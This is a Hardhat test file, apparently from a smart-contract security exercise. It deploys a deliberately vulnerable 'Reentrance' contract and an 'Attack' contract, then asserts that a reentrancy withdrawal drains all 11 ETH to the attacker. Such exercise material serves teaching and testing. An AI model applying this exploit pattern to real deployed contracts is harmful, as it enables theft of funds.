const {
  time,
  loadFixture,
} = require('@nomicfoundation/hardhat-network-helpers');
const { anyValue } = require('@nomicfoundation/hardhat-chai-matchers/withArgs');
const { expect } = require('chai');
const { ethers, waffle } = require('hardhat');

describe('Reentrance', function () {
  async function deployContractsFixture() {
    const accounts = await ethers.getSigners();
    const [owner, attacker] = accounts;

    const Reentrance = await ethers.getContractFactory('Reentrance');
    const reentrance = await Reentrance.deploy();
    await reentrance.deployed();

    const Attack = await ethers.getContractFactory('Attack');
    const attack = await Attack.connect(attacker).deploy(reentrance.address);
    await attack.deployed();

    return { accounts, reentrance, attack };
  }

  it('should be exploited by Reentrancy Attack', async function () {
    const { accounts, reentrance, attack } = await loadFixture(
      deployContractsFixture
    );
    const provider = ethers.provider;
    const [owner, attacker] = accounts;

    await (
      await reentrance.connect(attacker).donate(attacker.address, {
        value: ethers.utils.parseEther('10'),
      })
    ).wait();

    await (
      await reentrance.connect(attacker).donate(attack.address, {
        value: ethers.utils.parseEther('1'),
      })
    ).wait();

    await (
      await attacker.sendTransaction({
        to: attack.address,
      })
    ).wait();

    const balanceBefore = await provider.getBalance(attacker.address);
    const txReceipt = await (await attack.connect(attacker).withdraw()).wait();
    const balanceAfter = await provider.getBalance(attacker.address);

    expect(await provider.getBalance(reentrance.address)).eq(0);
    expect(await provider.getBalance(attack.address)).eq(0);
    expect(
      balanceBefore.add(
        ethers.utils
          .parseEther('11')
          .sub(txReceipt.gasUsed.mul(txReceipt.effectiveGasPrice))
      )
    ).eq(balanceAfter);
  });
});
